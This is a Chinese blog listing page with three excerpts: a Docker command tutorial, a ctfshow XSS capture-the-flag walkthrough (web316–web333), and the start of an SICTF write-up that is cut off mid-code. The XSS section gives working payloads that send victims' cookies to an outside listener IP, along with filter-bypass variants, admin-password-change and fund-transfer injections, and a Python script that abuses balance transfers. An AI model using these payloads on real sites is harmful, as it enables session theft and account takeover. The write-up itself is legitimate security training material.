<thead>
<tr>
<th>标签</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>REPOSITORY</td>
<td>镜像所在的仓库名称</td>
</tr>
<tr>
<td>TAG</td>
<td>镜像标签</td>
</tr>
<tr>
<td>IMAGEID</td>
<td>镜像ID</td>
</tr>
<tr>
<td>CREATED</td>
<td>镜像的创建日期(不是获取该镜像的日期)</td>
</tr>
<tr>
<td>SIZE</td>
<td>镜像大小</td>
</tr>
</tbody></table></div>

        <h3 id="拉去镜像-docker-pull">
          <a href="#拉去镜像-docker-pull" class="heading-link"><i class="fas fa-link"></i></a><a href="#拉去镜像-docker-pull" class="headerlink" title="拉去镜像(docker pull)"></a>拉去镜像(docker pull)</h3>
      <p>除了使用官方的镜像外,我们还可以在仓库中申请一个自己的账号,保存自己制作的进行,或者拉去使用他人的镜像。</p>

        <h1 id="官方镜像">
          <a href="#官方镜像" class="heading-link"><i class="fas fa-link"></i></a><a href="#官方镜像" class="headerlink" title="官方镜像"></a>官方镜像</h1>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">docker image pull 镜像名称 </span><br><span class="line"># 或简写为 </span><br><span class="line">docker pull 镜像名称</span><br><span class="line"># 比如</span><br><span class="line">docker pull ubuntu</span><br><span class="line">docker pull ubuntu:16.04</span><br><span class="line"></span><br><span class="line"># 个人镜像</span><br><span class="line">docker pull 仓库名称/镜像名称</span><br><span class="line">docker pull xunmi/django</span><br><span class="line"></span><br><span class="line"># 第三方仓库拉去</span><br><span class="line">docker pull 第三方仓库地址/仓库名称/镜像名称</span><br><span class="line">docker pull hub.c.163.com/library/mysql:latest</span><br><span class="line">(默认仓库名为library,所有从官方获取镜像相当于`sudo docker image pull library/镜像名称`)</span><br></pre></td></tr></table></div></figure>


        <h3 id="删除镜像-docker-rmi">
          <a href="#删除镜像-docker-rmi" class="heading-link"><i class="fas fa-link"></i></a><a href="#删除镜像-docker-rmi" class="headerlink" title="删除镜像(docker rmi)"></a>删除镜像(docker rmi)</h3>
      <figure class="highlight powershell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">rm</span> 镜像名或镜像ID 或 docker rmi 镜像名或镜像ID</span><br><span class="line">docker image <span class="built_in">rm</span> hello<span class="literal">-world</span></span><br><span class="line">docker rmi <span class="number">9</span>e64176cd8a2</span><br></pre></td></tr></table></div></figure>

<p>删除镜像的前提是没有使用这个镜像的容器,如果有需要先删除容器(报错:Error response from daemon: conflict: unable to delete 镜像ID (must be forced) - image is being used by stopped container 容器ID则代表有容器使用了此镜像。)可以尝试先执行docker rm 容器ID删除容器,如果还报错,可以看我下方删除容器的具体方法。<br>几条删除命令的区别</p>
<ul>
<li><p>docker rm: 删除一个或多个 容器</p>
</li>
<li><p>docker rmi: 删除一个或多个 镜像</p>
</li>
<li><p>docker prune: 用来删除不再使用的 docker 对象</p>
<p>##加载镜像(docker run)</p>
<p>上面我们说过,镜像只是一个只读类型的文件,而我们的环境不可能只是一个这样的文件,所以我们需要把这个镜像加载成我们的环境,也就是让他变成容器。</p>
</li>
</ul>
<figure class="highlight powershell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run [可选参数] 镜像名 [向启动容器中传入的命令]</span><br></pre></td></tr></table></div></figure>

<p>常用可选参数	作用<br>-i	表示以《交互模式》运行容器。<br>-d	会创建一个守护式容器在后台运行(这样创建容器后不会自动登录容器)。<br>-t	表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即分配一个伪终端。<br>–name	为创建的容器命名。(默认会随机给名字,不支持中文字符!!!)<br>-v	表示目录映射关系，即宿主机目录:容器中目录。注意:最好做目录映射，在宿主机上做修改，然后共享到容器上。<br>-p	表示端口映射，即宿主机端口:容器中端口。 比如:-p 8080:80 就是将容器中的80端口,映射到主机中的8080端口<br>–network&#x3D;host	表示将主机的网络环境映射到容器中，使容器的网络与主机相同。每个 Docker 容器都有自己的网络连接空间连接到虚拟 LAN。使用此命令则会让容器和主机共享一个网络空间。</p>
<p>可以启动一个系统docker run -i -d -t –name&#x3D;kali-test kalilinux&#x2F;kali-rolling(这里我使用linux的一个发行版kali作为介绍)<br>或可以简写为docker run -idt –name&#x3D;kali-test kalilinux&#x2F;kali-rolling<br>PS: 如果加载一个我们没有的镜像,docker会自动从官方仓库中进行拉去。</p>
<p>如果你没有下载docker&#x2F;getting-started的进行,这里会自动帮你下载<br> 成功启动后,可以在浏览器中输入<code>http://localhost:8080/</code>即可看到如下页面</p>
<p><img src="/2023/09/20/Docker%20file%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/AAwangzhan\1\hexoblog\source\image\image-20230919191443576.png"></p>

        <h2 id="使用交互式容器">
          <a href="#使用交互式容器" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用交互式容器" class="headerlink" title="使用交互式容器"></a>使用交互式容器</h2>
      <p>上面我们成功将镜像变成了容器,但上述的命令中我们都加入了-d,让容器在后台运行了。下面我们就来讲如何和正在运行的容器进行交互。</p>

        <h3 id="查看容器-docker-ps">
          <a href="#查看容器-docker-ps" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看容器-docker-ps" class="headerlink" title="查看容器(docker ps)"></a>查看容器(docker ps)</h3>
      <p>查看容器主要会用到ps命令</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前所有正在运行的容器</span><br><span class="line">docker ps</span><br><span class="line"># 查看当前所有的容器</span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line"># 使用过滤器(除了name外,常用的还可以指定id:id= 、所有停止的容器:status=exited,正在运行的容器:status=running 等)</span><br><span class="line"></span><br><span class="line">docker ps -f name=指定的名字</span><br><span class="line"></span><br><span class="line"># 显示2个上次创建的容器(2可以改变)</span><br><span class="line"></span><br><span class="line">docker ps -n 2</span><br><span class="line"></span><br><span class="line"># 显示最新创建的容器（包括所有状态）</span><br><span class="line"></span><br><span class="line">docker ps -l</span><br><span class="line"></span><br><span class="line"># 仅显示ip</span><br><span class="line"></span><br><span class="line">docker ps -q</span><br><span class="line"></span><br><span class="line"> # 显示容器大小</span><br><span class="line"></span><br><span class="line">docker ps -s</span><br></pre></td></tr></table></div></figure>

<div class="table-container"><table>
<thead>
<tr>
<th>标签</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>CONTAINER ID</td>
<td>镜像ID</td>
</tr>
<tr>
<td>IMAGE</td>
<td>创建容器的镜像名称</td>
</tr>
<tr>
<td>COMMAND</td>
<td>默认启动命令(启动时会自动执行)</td>
</tr>
<tr>
<td>CREATED</td>
<td>创建容器的日期</td>
</tr>
<tr>
<td>STATUS</td>
<td>当前的状态(启动了多久,多久之前退出等)</td>
</tr>
<tr>
<td>PORTS</td>
<td>映射的端口</td>
</tr>
<tr>
<td>NAMES</td>
<td>容器的名称</td>
</tr>
<tr>
<td>SIZE</td>
<td>容器大小(使用-s命令参数时才能看到)</td>
</tr>
</tbody></table></div>

        <h3 id="启动和关闭容器">
          <a href="#启动和关闭容器" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动和关闭容器" class="headerlink" title="启动和关闭容器"></a>启动和关闭容器</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 停止容器</span><br><span class="line"></span><br><span class="line">docker container stop 容器名或容器id</span><br><span class="line"></span><br><span class="line"># 或可简写为</span><br><span class="line"></span><br><span class="line">docker stop 容器名或容器id</span><br><span class="line"></span><br><span class="line"># 强制关闭容器</span><br><span class="line"></span><br><span class="line">docker container kill 容器名或容器id</span><br><span class="line"></span><br><span class="line"># 或可简写为</span><br><span class="line"></span><br><span class="line">docker kill 容器名或容器id</span><br><span class="line"></span><br><span class="line"># 启动容器</span><br><span class="line"></span><br><span class="line">docker container start 容器名或容器id</span><br><span class="line"></span><br><span class="line"># 或可简写为</span><br><span class="line"></span><br><span class="line">docker start 容器名或容器id</span><br></pre></td></tr></table></div></figure>

<p>如果我们成功启动或者关闭一个容器的话,会返回容器名或者容器id</p>
<p>stop和kill的区别: stop是比较优雅的关掉一个容器,类似我们正常退出一个软件,而kill是当一个进程出现意外无法正常关闭的时候,我们强行进行关闭,有点像我们使用任务管理器进行结束进程操作</p>
<p>操作后台容器</p>
<p>之前我们下过一个kali并且放在了后台运行,如果没有下载可以执行下列命令(docker run -i -d -t –name&#x3D;kali-test kalilinux&#x2F;kali-rolling),下面我们就用下面的命令开启kali(如果你下的是其他系统,比如ubuntu也可以举一反三一下)<br>首先我们确保我们要进入的容器是开启状态的,使用docker ps -a查看其中的STATUS属性是否是Up开头,如果不是先照着上面启动容器的方法开启容器<br>我们开启容器后,如果需要在容器内执行命令,可以将后台切换到前台,也可能使用docker命令将我们需要执行的命令传入。<br>操作方法有很多种,这里我们介绍一些比较常用的方法</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 如果我只需要执行简单的一两条命令可以使用docker exec</span><br><span class="line"></span><br><span class="line"># 执行单条命令 (-i: 启动并且保留交互式命令行; -t:作用是分配一个虚拟的终端; docker run )</span><br><span class="line"></span><br><span class="line">docker exec -it 容器名或容器id 执行的命令</span><br><span class="line"></span><br><span class="line"># 比如</span><br><span class="line"></span><br><span class="line">docker exec -it kali-test whoami</span><br><span class="line"></span><br><span class="line"># 用这种方法,我们还可以启动命令行,根据Linux的特性,系统程序会在/bin中,linux中常用的Shell有多个,其中大部分用的Linux默认的为bash</span><br><span class="line"></span><br><span class="line"># 所以我们启动命令可以自行如下命令(除了/bin/bash外,linux一般还会带/bin/sh、/bin/rbash、/bin/dash等,具体区别可以自行百度)</span><br><span class="line"></span><br><span class="line">docker exec -it 容器名或容器id /bin/bash</span><br><span class="line"></span><br><span class="line"># 比如</span><br><span class="line"></span><br><span class="line">docker exec -it kali-test /bin/bash</span><br><span class="line"></span><br><span class="line"># 除了exec外还有attach可以使用,但它有个弊端,多终端启动attach后,都会会同步显示。如果有一个窗口阻塞了，那么其他窗口也无法再进行操作。</span><br><span class="line"></span><br><span class="line">docker attach 容器名或容器id</span><br><span class="line"></span><br><span class="line"># 比如</span><br><span class="line">docker attach kali-test</span><br></pre></td></tr></table></div></figure>

<div class="table-container"><table>
<thead>
<tr>
<th>exec可选参数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>-d</td>
<td>会创建一个守护式容器在后台运行(这样创建容器后不会自动登录容器)。</td>
</tr>
<tr>
<td>-e</td>
<td>设置环境变量</td>
</tr>
<tr>
<td>-i</td>
<td>表示以《交互模式》运行容器。</td>
</tr>
<tr>
<td>-t</td>
<td>表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即分配一个伪终端。</td>
</tr>
<tr>
<td>-u</td>
<td>设置用户名和UID。</td>
</tr>
<tr>
<td>-w</td>
<td>设置容器内的工作目录。</td>
</tr>
</tbody></table></div>

        <h3 id="容器制作成镜像">
          <a href="#容器制作成镜像" class="heading-link"><i class="fas fa-link"></i></a><a href="#容器制作成镜像" class="headerlink" title="容器制作成镜像"></a>容器制作成镜像</h3>
      <ul>
<li><pre><code>我们为什么要把容器制作成镜像?

- 镜像可以看作为是一种备份,如果我们后期环境出现了问题,可以还原到早期镜像。

- 镜像便于传播,可以让自己的其他设备或他人的重复利用变得更加简单容易。

- # 将容器制作成镜像

  docker commit 容器名 镜像名

  # 镜像打包备份(打包备份的文件会自动存放在当前命令行的路径下,如果想让保存的文件可以打开,可以加.tar后缀)

  docker save -o 保存的文件名 镜像名

  # 镜像解压

  docker load -i 文件路径/备份文件
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  我们将打包备份的镜像可以通过网络发送到其他设备上,使用docker镜像解压即可直接使用你的环境。</span><br><span class="line"></span><br><span class="line">  # Docker Dashboard(Docker 仪表板)</span><br><span class="line"></span><br><span class="line">  Docker 仪表板的主要作用为:快速访问容器日志，启动容器的 shell，并轻松管理容器生命周期（停止、删除等）。</span><br><span class="line"></span><br><span class="line">![](D:\AAwangzhan\1\hexoblog\source\image\image-20230919194210103.png)</span><br><span class="line"></span><br><span class="line"> 在[Docker](https://so.csdn.net/so/search?q=Docker&amp;spm=1001.2101.3001.7020)中，我们无法删除正在运行的容器，请先将其停止。 </span><br><span class="line"></span><br><span class="line"> 停止所有正在运行的容器。 </span><br><span class="line"></span><br><span class="line">   Terminal  </span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">$ sudo docker stop $(sudo docker ps -aq)</span><br></pre></td></tr></table></div></figure>
</code></pre>
</li>
</ul>
<p> 卸下所有停止的容器。 </p>
<p>   Terminal  </p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker <span class="built_in">rm</span> $(sudo docker ps -aq)</span><br></pre></td></tr></table></div></figure>

<p>该错误的意思是docker已有一个容器占用了目前docker-compose里的subnet。<br>解决方法</p>
<p>1、修改当前docker-compose里的network配置，换一个subnet</p>
<p>2.执行命令docker network prune （原因：即使容器停止&#x2F;删除，网段依旧会被占用，运行该命令可清除占用子网网段即可）</p>
<p>在Dockerfile所在目录下，使用以下命令构建镜像：</p>
<p>其中，<code>-t</code>参数用于指定镜像的名称，<code>.</code>表示Dockerfile所在目录。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/">Ctfshow XSS跨站脚本注入漏洞 Web316-Web333</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ctfshow-XSS跨站脚本注入漏洞-web316-web333">
          <a href="#ctfshow-XSS跨站脚本注入漏洞-web316-web333" class="heading-link"><i class="fas fa-link"></i></a><a href="#ctfshow-XSS跨站脚本注入漏洞-web316-web333" class="headerlink" title="ctfshow XSS跨站脚本注入漏洞 web316-web333"></a>ctfshow XSS跨站脚本注入漏洞 web316-web333</h1>
      <p>做题过程要用到的平台<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://xss.pt/%EF%BC%8C%E5%88%9B%E5%BB%BA%E8%B4%A6%E5%8F%B7%EF%BC%8C%E5%A5%BD%E5%A4%9Aplayload%EF%BC%8C%E5%9C%A8%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E4%BA%86%E5%8F%AF%E7%9C%8B%E5%88%B0flag">https://xss.pt/，创建账号，好多playload，在项目管理了可看到flag</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="web316">
          <a href="#web316" class="heading-link"><i class="fas fa-link"></i></a><a href="#web316" class="headerlink" title="web316"></a>web316</h2>
      <p>用平台上pLAYload怎么是都是有no admin，很奇怪，看到网上用服务器监听，我也监听了，就是说，为啥还是</p>
<p><img src="/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/AAwangzhan\1\hexoblog\source\image\image-20230916150656330.png"></p>
<p>服啦</p>
<p>最后用自己服务器传入</p>
<script>location.href="http://ip:39543/"+document.cookie</script>

<p>服务器python3 -m http.server 39543可得到flag</p>

        <h2 id="web317">
          <a href="#web317" class="heading-link"><i class="fas fa-link"></i></a><a href="#web317" class="headerlink" title="web317"></a>web317</h2>
      <p>原理同上，<script>被过滤,换成img</p>
<img src='' onerror="location.href='http://ip:39543/'+document.cookie">


        <h2 id="web318"   >
          <a href="#web318" class="heading-link"><i class="fas fa-link"></i></a><a href="#web318" class="headerlink" title="web318"></a>web318</h2>
      <p>换iframe标签</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=document.location=&#x27;http://ip:39543/?cookie=&#x27;+document.cookie&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="web319"   >
          <a href="#web319" class="heading-link"><i class="fas fa-link"></i></a><a href="#web319" class="headerlink" title="web319"></a>web319</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=window.open(&#x27;http://123.57.236.154:39543/?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="web320"   >
          <a href="#web320" class="heading-link"><i class="fas fa-link"></i></a><a href="#web320" class="headerlink" title="web320"></a>web320</h2>
      <p>过滤了空格</p>
<blockquote>
<p>绕过方法：</p>
<p>TAB</p>
<p>/</p>
<p>/**/</p>
</blockquote>
<p>上一题playload需要简单变换一下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe/onload=window.open(&#x27;http://123.57.236.154:39543/?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></div></figure>

<p>利用String.fromCharCode来进行转换</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,46,115,98,47,49,66,113,117,62,60,47,115,67,114,73,112,84,62));&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="web321"   >
          <a href="#web321" class="heading-link"><i class="fas fa-link"></i></a><a href="#web321" class="headerlink" title="web321"></a>web321</h2>
      <p>iframe仍然可以</p>

        <h2 id="web322"   >
          <a href="#web322" class="heading-link"><i class="fas fa-link"></i></a><a href="#web322" class="headerlink" title="web322"></a>web322</h2>
      <p>iframe仍然可以</p>

        <h2 id="web323"   >
          <a href="#web323" class="heading-link"><i class="fas fa-link"></i></a><a href="#web323" class="headerlink" title="web323"></a>web323</h2>
      <p>iframe仍然可以</p>

        <h2 id="web324"   >
          <a href="#web324" class="heading-link"><i class="fas fa-link"></i></a><a href="#web324" class="headerlink" title="web324"></a>web324</h2>
      <p>这次过滤了iframe</p>
<p>我不知道用啥了。。。。</p>
<p>看了大佬的wp，用svg还可以绕过</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=window.open(&#x27;http://123.57.236.154:39543/?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="web325"   >
          <a href="#web325" class="heading-link"><i class="fas fa-link"></i></a><a href="#web325" class="headerlink" title="web325"></a>web325</h2>
      <p>svg仍可</p>

        <h2 id="web326"   >
          <a href="#web326" class="heading-link"><i class="fas fa-link"></i></a><a href="#web326" class="headerlink" title="web326"></a>web326</h2>
      <p>svg可</p>

        <h2 id="web327"   >
          <a href="#web327" class="heading-link"><i class="fas fa-link"></i></a><a href="#web327" class="headerlink" title="web327"></a>web327</h2>
      <p>到存储型xss</p>
<p>盲猜上一题playload可以</p>
<p>果然，可以</p>
<p>当然也可以：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=window.open(&#x27;http://123.57.236.154::39543/&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="web328"   >
          <a href="#web328" class="heading-link"><i class="fas fa-link"></i></a><a href="#web328" class="headerlink" title="web328"></a>web328</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://123.57.236.154:39543/&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>先注册，密码就是上面的xss，之后我们会在服务器获取到管理员的phpsession</p>
<p><img src="D:\AAwangzhan\1\hexoblog\source\image\image-20230916171228602.png" alt="image-20230916171228602"></p>
<p>之后将浏览器PHPsession改成监听到的，查看用户管理，可得到flag</p>
<p><img src="D:\AAwangzhan\1\hexoblog\source\image\image-20230916171325595.png"></p>

        <h2 id="web329"   >
          <a href="#web329" class="heading-link"><i class="fas fa-link"></i></a><a href="#web329" class="headerlink" title="web329"></a>web329</h2>
      <p>这次cookie不持久，所以就直接获取页面信息，通过document来获取</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://123.57.236.154:39543/&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>可直接监听到flag</p>

        <h2 id="web330"   >
          <a href="#web330" class="heading-link"><i class="fas fa-link"></i></a><a href="#web330" class="headerlink" title="web330"></a>web330</h2>
      <p>注册时用户名为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://127.0.0.1/api/change.php?p=123456&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>密码随便，将admin密码改为123456</p>
<p>等待一会登录admin，密码为123456</p>

        <h2 id="web331"   >
          <a href="#web331" class="heading-link"><i class="fas fa-link"></i></a><a href="#web331" class="headerlink" title="web331"></a>web331</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&quot;api/change.php&quot;,method:&quot;POST&quot;,data:&#123;&#x27;p&#x27;:&#x27;1234567&#x27;&#125;&#125;)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>换了post传参方法。原理同上</p>

        <h2 id="web332"   >
          <a href="#web332" class="heading-link"><i class="fas fa-link"></i></a><a href="#web332" class="headerlink" title="web332"></a>web332</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script&gt;$.ajax(&#123;url: &quot;http://127.0.0.1/api/amount.php&quot;,method: &quot;POST&quot;,data: &#123;&#x27;u&#x27;=&#x27;gylq&#x27;,&#x27;a&#x27;:10000&#125;,cache: false,success: function(res)&#123;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>给admin账户设置为10000</p>
<p>注册上先，登录。给admin转-10000，在购买flag</p>

        <h2 id="web333"   >
          <a href="#web333" class="heading-link"><i class="fas fa-link"></i></a><a href="#web333" class="headerlink" title="web333"></a>web333</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">x=5</span><br><span class="line">url=&quot;http://274ff6c1-4707-4493-90e6-f0bddae37424.challenge.ctf.show/api/amount.php&quot;</span><br><span class="line">url2=&quot;http://274ff6c1-4707-4493-90e6-f0bddae37424.challenge.ctf.show/api/getFlag.php&quot;</span><br><span class="line">headers=&#123;&#x27;Cookie&#x27;:&#x27;PHPSESSID=2og1nbla83d4tkt7qiksqjvdpl&#x27;&#125;  #自己登录后的sessionid</span><br><span class="line">while True:</span><br><span class="line">   print(x)</span><br><span class="line">   t=x-1</span><br><span class="line">   data=&#123;</span><br><span class="line">   &#x27;u&#x27;:&#x27;111&#x27;, #注册的用户名</span><br><span class="line">   &#x27;a&#x27;:str(t)</span><br><span class="line">   &#125;</span><br><span class="line">   r=requests.post(url,headers=headers,data=data)</span><br><span class="line">   print(r.text)</span><br><span class="line">   if(x&gt;10000):</span><br><span class="line">      r2=requests.get(url2,headers=headers)</span><br><span class="line">      print(r2.text)</span><br><span class="line">      break</span><br><span class="line">   x+=t</span><br></pre></td></tr></table></div></figure></script></p></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/09/10/SICTF-2nd/">SICTF-2nd</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>比赛打完了，虽然是个公益赛，也是拿到了名次，可是自己还是太菜了，只能做些简单题。。。</p>

        <h1 id="MISC">
          <a href="#MISC" class="heading-link"><i class="fas fa-link"></i></a><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1>
      
        <h3 id="签到-Welcome">
          <a href="#签到-Welcome" class="heading-link"><i class="fas fa-link"></i></a><a href="#签到-Welcome" class="headerlink" title="签到]Welcome"></a>签到]Welcome</h3>
      <p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194808039.png"></p>

        <h3 id="Pixel-art">
          <a href="#Pixel-art" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL import Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开PNG图像文件</span></span><br><span class="line">image = 